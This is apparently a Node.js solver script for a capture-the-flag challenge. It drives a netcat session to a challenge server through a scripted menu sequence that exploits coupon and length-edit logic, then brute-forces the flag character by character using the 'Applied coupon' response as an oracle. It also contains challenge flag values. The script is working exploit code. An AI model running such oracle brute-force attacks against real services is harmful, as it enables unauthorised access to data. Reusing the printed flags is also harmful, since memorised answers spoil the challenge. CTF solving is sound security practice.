const NetcatClient = require('netcat/client')
const nc2 = new NetcatClient()
const fs = require('fs');
let flag = "CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}";

async function main() {
    let indexToSearch = flag.length + 1;
    console.log('searching for the index: ', indexToSearch);
    await delay(1000);
    await searchIndex(indexToSearch);

}

async function searchIndex(i) {
    try {

        let alphabet = `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#$%&'(){}-.<=>?@[]^`;
        let inputStream = nc2.addr('csa-2.csa-challenge.com').port(2222).connect().stream();
        let chIndex = 0;
        let totalCoupons = 0;
        let isFound = false;

        inputStream.on('data', (msg) => {
            let str = Buffer.from(msg).toString()
            console.log(str);

            // check if coupon (3rd one) is found
            if (str.includes('Applied coupon')) {
                totalCoupons++;
                console.log('>> find coupon');
                if (totalCoupons == 3) {
                    nc2.close();
                    isFound = true;
                    let nextChar = alphabet[chIndex - 1];
                    flag += nextChar;
                    console.log('flag', flag);
                    fs.appendFileSync('flag.txt', nextChar);
                }
            }
        });

        inputStream.on('error', function (err) {
            console.log(err);
        })

        await delay(1000);

        console.log('send initial setup');
        await sendInitialSteps(nc2, i);

        // loop: 5, guess, 5,guess until we found the next char
        for (const ch of alphabet) {
            if (nc2 && !isFound) {
                await delay();

                sendMsg(nc2, '5');

                await delay();
                sendMsg(nc2, flag + ch);

                chIndex++;
            }
        }


    } catch (error) {
        console.log(error);
    }

}

function delay(ms = 100) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}


function sendMsg(nc2, msg) {
    console.log('>', msg);
    nc2.send(msg + '\n');
}

async function sendInitialSteps(nc2, i) {
    await delay();
    sendMsg(nc2, '5');

    await delay();
    sendMsg(nc2, 'NOT_A_FLAG{I_4M_A_N3WB1E}');

    await delay();
    sendMsg(nc2, '5');

    await delay();
    sendMsg(nc2, 'CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}');

    await delay();
    sendMsg(nc2, '2');

    await delay();
    sendMsg(nc2, '2');

    await delay();
    sendMsg(nc2, '4');

    await delay();
    sendMsg(nc2, '' + i);

    await delay();
    sendMsg(nc2, '2');

    await delay();
    sendMsg(nc2, '2');

    await delay();
    sendMsg(nc2, '3');

    await delay();
    sendMsg(nc2, '0');

    await delay();
    sendMsg(nc2, '2');

    await delay();
    sendMsg(nc2, '2');

}



main();

// algorithm:
/**
 * welcome msg
 * press 5 (apply coupon)
 * insert coupon NOT_A_FLAG{I_4M_A_N3WB1E}
 * press 5
 * insert coupon CSA{iN_L1nuX_1T_W0UlDnT_H4PP3N}
 * press 2
 * press 2
 * press 4 (edit loaves = edit length)
 *  press i (=5 initially since it starts with CSA{)
 * press 2
 * press 2
 * press 3
 * press 0 (zero item amounts)
 * press 2
 * press 2
 * press 5 (apply coupon)
 * insert guess CSA{a
 * press 5
 * insert next guess
*/